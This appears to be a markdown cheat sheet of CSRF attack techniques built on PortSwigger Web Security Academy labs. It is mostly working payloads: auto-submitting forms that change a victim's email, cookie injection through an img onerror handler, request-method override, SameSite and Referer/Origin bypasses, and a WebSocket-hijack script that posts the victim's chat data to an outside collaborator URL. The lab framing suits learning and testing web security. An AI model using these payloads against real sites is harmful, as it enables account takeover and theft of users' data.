# How does CSRF work  
To exploit a CSRF vulnerability, several conditions must be met:  

1. Identify a Valuable Action: The attacker needs to find an action worth exploiting, such as changing the user's password, email, or elevating privileges.  
2. Session Management: The user's session should be managed solely through cookies or the HTTP Basic Authentication header, as other headers cannot be manipulated for this purpose.  
3. Absence of Unpredictable Parameters: The request should not contain unpredictable parameters, as they can prevent the attack.

# Defences Bypass  
1. Ð¡hange request method.
2. Just delete CSRF token.
3. CSRF token is not tied to the user session  
    How to exploit:
    1. Authenticate using their own account.
    2. Obtain a valid CSRF token from the global pool.
    3. Use this token in a CSRF attack against a victim.
    ```
    <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
    ```
4. Method bypass  
    1. Change request method to GET and add _method=POST parameter:
    ```
    /example.com/my/dear/api/val/num? _method=POST
    ```
    ```
    <script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";  
    </script>
    ```
5. SameSite Strict bypass via client-side redirect  
    ```
    /post/comment/confirmation?postId=7../../../my-account/change-email?email=ww%40gmail.com%26submit=1
    ```
6. SameSite Strict bypass via sibling domain  
    >Example Burp lab:
    >Observe there is cms-xxx.web-security-academy.net domain. Craft the next payload and full URL-encode it.
    ```
    <script>
        var ws = new WebSocket('wss://your-websocket-url/chat');
        ws.onopen = function() {
            ws.send("READY");
        };
        ws.onmessage = function(event) {
            fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
        };
    </script>
    ```
    >Create the second payload and send it to victim:
    ```
    <script>
    location="https://cms-xxx.web-security-academy.net/login?username=URL-ENCODED-PAYLOAD&password=peter"
    </script>
    ```
7. SameSite Lax bypass via cookie refresh  
    >Browsers block popups from being opened unless they are triggered by a manual user interaction, such as a click. The victim user will click on any page you send them to, so you can create popups using a global event handler as follows: 
    ```
    <script>
        window.onclick = () => {
            window.open('about:blank')
        }
    </script>
    ```
8. Referrer / Origin check bypass
    1. Avoid Referrer header    
    Applications may validate the 'Referer' header only when it's present. To prevent a browser from sending this header, the following HTML meta tag can be used:
    ```
    <meta name="referrer" content="never">
    ```
    2. Set the server's domain name as a parameter in the URL sent by the referrer
    ```
    <html>
      <!-- Referrer policy needed to send the qury parameter in the referrer -->
      <head><meta name="referrer" content="unsafe-url"></head>
      <body>
      <script>history.pushState('', '', '/')</script>
        <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
          <input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
          <input type="submit" value="Submit request" />
        </form>
        <script>
          // You need to set this or the domain won't appear in the query of the referer header
          history.pushState("", "", "?YOUR-LAB-ID.web-security-academy.net")
          document.forms[0].submit();
        </script>
      </body>
    </html>
    ```
## Deliver exploit to victim example
```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```
